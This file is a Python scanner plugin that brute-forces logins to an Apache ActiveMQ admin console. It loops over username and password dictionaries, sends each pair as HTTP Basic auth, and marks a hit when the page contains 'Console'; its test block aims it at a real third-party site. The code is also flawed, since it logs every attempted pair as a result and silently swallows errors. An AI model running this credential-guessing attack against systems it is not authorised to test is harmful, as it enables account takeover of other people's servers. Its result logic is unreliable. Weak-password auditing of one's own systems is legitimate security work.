#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

from base64 import b64encode, b64decode

def info(data=None):
    info = {
        "name": "Acticemq burst",
        "info": "activemq burst.",
        "level": "high",
        "type": "weakpass",
    }
    return info



def prove(data):
    data = init(data, 'activemq')
    if data['base_url']:
        usernamedic = _read_dic(data['d1']) if 'd1' in data.keys() else  _read_dic('dict/activemq_usernames.txt')
        passworddic = _read_dic(data['d2']) if 'd2' in data.keys() else  _read_dic('dict/activemq_passwords.txt')
        url = data['base_url'] + "admin/"
        for linef1 in usernamedic:
            username = linef1.strip('\r').strip('\n')
            for linef2 in passworddic:
                try:
                    password = (
                        linef2 if '%user%' not in linef2 else str(linef2).replace("%user%", str(username))).strip(
                        '\r').strip('\n')
                    key = b64encode(":".join([username,password]))
                    data['headers']["Authorization"] = 'Basic %s' % key
                    res = curl('get',url)
                    if 'Console' in res.text:
                        data['flag'] = 1
                    data['data'].append({"username": username,"password":password})
                    data['res'].append({"info": username + "/" + password, "key": "Authorization: " + key})
                except Exception:
                    pass
    return data




def _read_dic(dicname):
    with open(dicname, 'r') as f:
        return f.readlines()


if __name__=='__main__':
    from script import init, curl
    print(prove({'url':'http://www.baidu.com','flag':-1,'data':[],'res':[]}))